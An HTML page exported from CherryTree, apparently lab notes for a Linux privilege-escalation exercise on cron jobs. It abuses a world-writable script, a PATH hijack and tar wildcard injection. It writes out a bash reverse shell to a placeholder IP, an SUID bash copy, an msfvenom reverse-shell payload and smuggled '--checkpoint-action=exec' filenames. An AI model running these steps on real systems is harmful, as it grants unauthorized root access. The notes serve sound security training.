<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Cron jobs</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Cron jobs</h1><br/><p><strong><h1>Cron jobs</h1></strong></p><p></p><p></p><p><strong><h2>A) File Permissions</h2></strong></p><p></p><p>Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.</p><p></p><p>View the contents of the <strong>system-wide cronta</strong>b:</p><p></p><p><strong>cat /etc/crontab</strong></p><p></p><p>There should be two cron jobs scheduled to run every minute. One runs <strong>overwrite.sh</strong>, the other runs <strong>/usr/local/bin/compress.sh</strong>.</p><p></p><p>Locate the full path of the <strong>overwrite.sh</strong> file:</p><p></p><p><strong>locate overwrite.sh</strong></p><p></p><p><strong>Note</strong> that the file is world-writable:</p><p></p><p><strong>ls -l /usr/local/bin/overwrite.sh</strong></p><p></p><p>Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.</p><p></p><p><strong>#!/bin/bash</strong></p><p><strong>bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</strong></p><p></p><p>Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.</p><p></p><p><strong>nc -nvlp 4444</strong></p><p></p><p></p><p><strong><h2>B) PATH Environment Variable</h2></strong></p><p></p><p>View the contents of the system-wide crontab:</p><p></p><p><strong>cat /etc/crontab</strong></p><p></p><p>Note that the PATH variable starts with /home/user which is our user&#39;s home directory.</p><p></p><p>Create a file called overwrite.sh in your home directory with the following contents:</p><p></p><p><strong>#!/bin/bash</strong></p><p></p><p><strong>cp /bin/bash /tmp/rootbash</strong></p><p><strong>chmod +xs /tmp/rootbash</strong></p><p></p><p>Make sure that the file is executable:</p><p></p><p><strong>chmod +x /home/user/overwrite.sh</strong></p><p></p><p>Note: Here we could create a script bash reverse shell &amp; the connection will be made as root, since root is running the script. (Similar to previous way <strong>A</strong>)</p><p></p><p>Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:</p><p></p><p><strong>/tmp/rootbash -p</strong></p><p></p><p>Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!</p><p></p><p></p><p><strong><h2>C) Wildcards</h2></strong></p><p></p><p>View the contents of the other cron job script:</p><p></p><p><strong>cat /usr/local/bin/compress.sh</strong></p><p></p><p>Note that the tar command is being run with a <strong>wildcard (*)</strong> in your home directory.</p><p></p><p>Take a look at the <strong>GTFOBins</strong> page for <strong>tar</strong>. Note that tar has command line options that let you run other commands as part of a checkpoint feature.</p><p></p><p>Use <strong>msfvenom</strong> on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:</p><p></p><p><strong>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</strong></p><p></p><p><strong>Note:</strong> Stageless Shell is necessary for it to work properly.</p><p>Transfer the <strong>shell.elf</strong> file to <strong>/home/user/ </strong>on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:</p><p></p><p><strong>chmod +x /home/user/shell.elf</strong></p><p></p><p>Create these two files in <strong>/home/user</strong>:</p><p></p><p><strong>touch /home/user/--checkpoint=1</strong></p><p><strong>touch /home/user/--checkpoint-action=exec=shell.elf</strong></p><p></p><p>When the tar command in the cron job runs, the <strong>wildcard (*) </strong>will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.</p><p></p><p>Set up a netcat listener on your Kali box on port <strong>4444</strong> and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.</p><p></p><p><strong>nc -nvlp 4444</strong></p><p></p><p>Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:</p><p></p><p><strong>rm /home/user/shell.elf</strong></p><p><strong>rm /home/user/--checkpoint=1</strong></p><p><strong>rm /home/user/--checkpoint-action=exec=shell.elf</strong></p><p></p><p><strong><h2>END</h2></strong></p></div>
</body>
</html>
